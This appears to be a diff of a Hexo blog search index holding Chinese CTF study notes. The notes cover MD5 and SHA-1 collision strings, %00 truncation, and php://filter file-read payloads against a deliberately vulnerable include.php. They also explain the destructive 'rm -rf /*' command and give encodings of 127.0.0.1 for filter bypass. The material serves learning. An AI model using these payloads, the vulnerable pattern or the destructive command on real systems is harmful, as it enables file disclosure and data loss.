@@ -1,13 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>特殊的md5值</title>
-    <url>/2022/01/06/%E7%89%B9%E6%AE%8A%E7%9A%84md5%E5%80%BC/</url>
+    <title></title>
+    <url>/2022/03/12/%E6%9D%82%E9%A1%B9/%E7%89%B9%E6%AE%8A%E7%9A%84md5%E5%80%BC/</url>
     <content><![CDATA[<h3 id="三个相同MD5值的字符串-字符串不同，细微区别"><a href="#三个相同MD5值的字符串-字符串不同，细微区别" class="headerlink" title="三个相同MD5值的字符串(字符串不同，细微区别):"></a>三个相同<code>MD5</code>值的字符串(字符串不同，细微区别):</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s1</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s2</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s3</span>)));</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h3 id="三个相同MD5值的字符串-字符串不同，细微区别-1"><a href="#三个相同MD5值的字符串-字符串不同，细微区别-1" class="headerlink" title="三个相同MD5值的字符串(字符串不同，细微区别):"></a>三个相同<code>MD5</code>值的字符串(字符串不同，细微区别):</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s1</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s2</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s3</span>)));</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br></pre></td></tr></table></figure>
@@ -29,159 +25,724 @@
 ]]></content>
   </entry>
   <entry>
-    <title>00截断</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/00%E6%88%AA%E6%96%AD/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h2 id="0x00截断和-00截断"><a href="#0x00截断和-00截断" class="headerlink" title="0x00截断和%00截断"></a>0x00截断和%00截断</h2><h3 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。</p>
-<h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><p> PHP&lt;5.3.29 ，且GPC关闭</p>
-<h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>%00截断与0x00截断是一样的   </p>
-<p>只不过是用于 url 中的截断</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>PHP伪协议</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h3 id="作用"><a href="#作用" class="headerlink" title="作用:"></a>作用:</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的，且不受allow_url_fopen与allow_url_include的影响。</p>
-<p>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p>
-<span id="more"></span>
-
-<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件:"></a>条件:</h3><ol>
-<li>allow_url_fopen:off/on</li>
-<li>allow_url_include:off/on</li>
-</ol>
-<h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用:"></a>作用:</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的，且不受allow_url_fopen与allow_url_include的影响。</p>
-<p>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p>
-<h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件:"></a>条件:</h3><ol>
-<li>allow_url_fopen:off/on</li>
-<li>allow_url_include:仅php://input php://stdin php://memory php://temp 需要on</li>
-</ol>
-<h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用:"></a>作用:</h3><p>php://访问各个输入/输出流(I/O streams)，在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
-<p>php://filter参数详解</p>
-<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+    <title>一些小知识</title>
+    <url>/2022/03/12/%E6%9D%82%E9%A1%B9/%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h2 id="MIME是什么"><a href="#MIME是什么" class="headerlink" title="MIME是什么?"></a>MIME是什么?</h2><p><code>MIME</code>意为多功能<code>Internet</code>邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。</p>
+<p>文件后缀名在网页上并没有明确的意义。 因此，使服务器设置正确的传输类型非常重要，所以正确的<code>MIME</code>类型与每个文件一同传输给服务器。在网络资源进行连接时，浏览器经常使用<code>MIME</code>类型来决定执行何种默认行为。</p>
+<p>是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会<strong>自动使用</strong>指定应用程序来打开。多用于指定一些客户端<strong>自定义</strong>的文件名，以及一些媒体文件打开方式。</p>
+<h3 id="MIME嗅探"><a href="#MIME嗅探" class="headerlink" title="MIME嗅探"></a>MIME嗅探</h3><p>在缺失<code> MIME</code> 类型或客户端认为文件设置了错误的 <code>MIME</code> 类型时，浏览器可能会通过查看资源来进行<code>MIME</code>嗅探。每一个浏览器在不同的情况下会执行不同的操作。因为这个操作会有一些安全问题，有的 <code>MIME </code>类型表示可执行内容而有些是不可执行内容。浏览器可以通过请求头 <code>Content-Type</code> 来设置 <code>X-Content-Type-Options</code> 以阻止<code>MIME</code>嗅探。</p>
+<h2 id="robots协议？"><a href="#robots协议？" class="headerlink" title="robots协议？"></a>robots协议？</h2><p><code>robots</code>协议也叫<code>robots.txt</code>（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以<code>robots.txt</code>的文件名应统一为<strong>小写</strong>。<code>robots.txt</code>应放置于网站的根目录下。</p>
+<p><strong><code>robots</code>协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
+<h2 id="后缀为-phps的文件是什么？"><a href="#后缀为-phps的文件是什么？" class="headerlink" title="后缀为.phps的文件是什么？"></a>后缀为.phps的文件是什么？</h2><p><code>phps</code>文件是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用<code>phps</code>文件代替。(其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了<code>phps</code>文件类型。)</p>
+<p>但并不是所有php文件都有<code>.phps</code>后缀文件</p>
+<h2 id="htaccess文件是什么？"><a href="#htaccess文件是什么？" class="headerlink" title=".htaccess文件是什么？"></a>.htaccess文件是什么？</h2><p><code>.htaccess</code>是一个配置文件(纯文本文件)，里面存放着<code>Apache</code>服务器配置相关的一些指令，它类似于Apache的站点配置文件，如<code>httpd.conf</code>（<code>Apache2</code>已经支持多站点，因此你的站点配置文件可能在<code>/etc/apache2/conf.d/</code>目录下）。</p>
+<p><code>.htaccess</code>与<code>httpd.conf</code>配置文件不同的是，它只作用于当前目录。另外<code>httpd.conf</code>是在<code>Apache</code>服务启动的时候就加载的，而<code>.htaccess</code>只有在用户访问目录时加载，开销大、速度慢。</p>
+<p>既然如此，为什么我们还要用<code>.htaccess</code>呢？因为它配置起来简单，它还支持网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能，另外它管理起来很方便，可以很好适应网站迁移。</p>
+<h2 id="Tor浏览器"><a href="#Tor浏览器" class="headerlink" title="Tor浏览器"></a>Tor浏览器</h2><p>一款是你匿名访问网络的的软件。用户通过<code>Tor</code>可以在因特网上进行匿名交流。(基于火狐浏览器的浏览器)，后缀为<code>onion</code>的网站需要用此浏览器访问。</p>
+<p>为了实现匿名目的，<code>Tor</code>把分散在全球的计算机集合起来形成一个加密回路。当你通过<code>Tor</code>网络访问互联网时，你的网络数据会通过多台电脑迂回发送，就像洋葱包裹其核心那样掩饰你的网络活动，信息传输在每一步都被加密，无从得知你所处位置和信息传输目的地。因此<code>Tor Browser</code>也被称为洋葱浏览器。</p>
+<h2 id="移位计算的一个特殊值"><a href="#移位计算的一个特殊值" class="headerlink" title="移位计算的一个特殊值"></a>移位计算的一个特殊值</h2><p>125&lt;&lt;3 = 1000</p>
+<p>0111 1101 &lt;&lt; 后为 0011 1110 1000 的十进制为1000</p>
+<p>同理8000&gt;&gt;3 =1000</p>
 <table>
 <thead>
 <tr>
-<th>php://filter 参数</th>
-<th>描述</th>
-<th></th>
+<th>HEX</th>
+<th>3E8</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>resource=&lt;要过滤的数据流&gt;</td>
-<td>必须项。它指定了你要筛选过滤的数据流。</td>
-<td></td>
+<td>DEC</td>
+<td>1,000</td>
 </tr>
 <tr>
-<td>read=&lt;读链的过滤器&gt;</td>
-<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
-<td>*）分隔。</td>
+<td>OCT</td>
+<td>1750</td>
 </tr>
 <tr>
-<td>write=&lt;写链的过滤器&gt;</td>
-<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
-<td>）分隔。</td>
-</tr>
-<tr>
-<td>&lt;; 两个链的过滤器&gt;</td>
-<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
-<td></td>
+<td>BIN</td>
+<td>0011 1110 1000</td>
 </tr>
 </tbody></table>
-<h3 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h3><p>1.<code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure>
+<h2 id="删库跑路-rm-rf"><a href="#删库跑路-rm-rf" class="headerlink" title="删库跑路  rm -rf /*"></a>删库跑路  rm -rf /*</h2><p><code>rm </code>命令可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-f</td>
+<td>强制删除文件或目录</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>删除已有文件或目录之前先询问用户</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>递归处理， 将指定目录下的所有文件与子目录一并处理</td>
+</tr>
+<tr>
+<td>/</td>
+<td>在Linux中表示根目录</td>
+</tr>
+<tr>
+<td>*</td>
+<td>所有文件</td>
+</tr>
+<tr>
+<td>/*</td>
+<td>根目录下的所有文件</td>
+</tr>
+</tbody></table>
+<p>而<code>mv</code>命令是用来移动文件或者将文件改名，备份文件或者目录。</p>
+<h2 id="Linux系统中的反引号"><a href="#Linux系统中的反引号" class="headerlink" title="Linux系统中的反引号"></a>Linux系统中的反引号</h2><p>在<code>linux</code>中反引号的作用就是将反引号内的<code>Linux</code>命令先执行，然后将执行结果赋予变量。<br> 比如<code> cat \</code>ls` <code>相当于将 </code>ls<code>出来的结果</code>cat`。</p>
+<h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h2><p><code>jsfuck</code>源于一门编程语言<code>brainfuck</code>，其主要的思想就是只使用8种特定的符号来编写代码。而<code>jsfuck</code>也是沿用了这个思想，它仅仅使用6种符号来编写代码。它们分别是(、)、+、[、]、!。(用6个字符输出任意<code>JavaScript</code>)</p>
+<h2 id="sha1碰撞"><a href="#sha1碰撞" class="headerlink" title="sha1碰撞"></a>sha1碰撞</h2><p>这两个值<code>a</code>和<code>b</code>值不同但是<code>sha1</code>值相同</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
 
-<p>include.php文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure>
 
-<p>phpinfo.php文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="127-0-0-1的各种进制，一般利用十进制绕过"><a href="#127-0-0-1的各种进制，一般利用十进制绕过" class="headerlink" title="127.0.0.1的各种进制，一般利用十进制绕过"></a>127.0.0.1的各种进制，一般利用十进制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:</span><br><span class="line">八进制：0177.0.0.1</span><br><span class="line">十六进制：0x7f.0.0.1</span><br><span class="line">十进制：2130706433</span><br></pre></td></tr></table></figure>
 
-<p>然后得到结果</p>
-<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20211010115926270.png" class="" title="image-20211010115926270">
